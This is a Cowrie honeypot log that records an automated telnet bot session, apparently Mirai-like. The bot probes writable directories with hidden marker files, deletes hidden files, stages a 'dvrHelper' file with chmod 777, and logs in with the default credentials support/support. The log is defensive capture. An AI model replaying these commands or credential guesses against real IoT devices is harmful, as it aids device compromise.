+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev/shm'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/shm/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/run/lock'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/lock/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon; /bin/busybox cat /boot/.nippon; /bin/busybox rm /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/boot'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /boot/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon; /bin/busybox cat /home/.nippon; /bin/busybox rm /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/home'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /home/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /.t; rm /.sh; rm /.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /sys/.t; rm /sys/.sh; rm /sys/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /sys/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /sys/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /sys/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /proc/.t; rm /proc/.sh; rm /proc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/pts/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/pts/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/pts/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /run/.t; rm /run/.sh; rm /run/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /.t; rm /.sh; rm /.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /dev/shm/.t; rm /dev/shm/.sh; rm /dev/shm/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/shm/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/shm/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/shm/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /run/lock/.t; rm /run/lock/.sh; rm /run/lock/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/lock/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/lock/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/lock/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /boot/.t; rm /boot/.sh; rm /boot/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /boot/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /boot/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /boot/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /home/.t; rm /home/.sh; rm /home/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /home/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /home/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /home/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.t
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.sh
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.human
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: cd /
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cd /
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cp /bin/echo dvrHelper
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cp /bin/echo dvrHelper
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: > /dvrHelper
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox chmod 777 /dvrHelper
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: chmod 777 /dvrHelper
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /bin/echo
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:58+0000 [CowrieTelnetTransport,44526,163.172.104.150] login attempt: 3
+2017-06-12T10:11:58+0000 [CowrieTelnetTransport,44526,163.172.104.150] login return, expect: [support/support]
+2017-06-12T10:12:01+0000 [CowrieTelnetTransport,44526,163.172.104.150] login attempt [support/support] succeeded
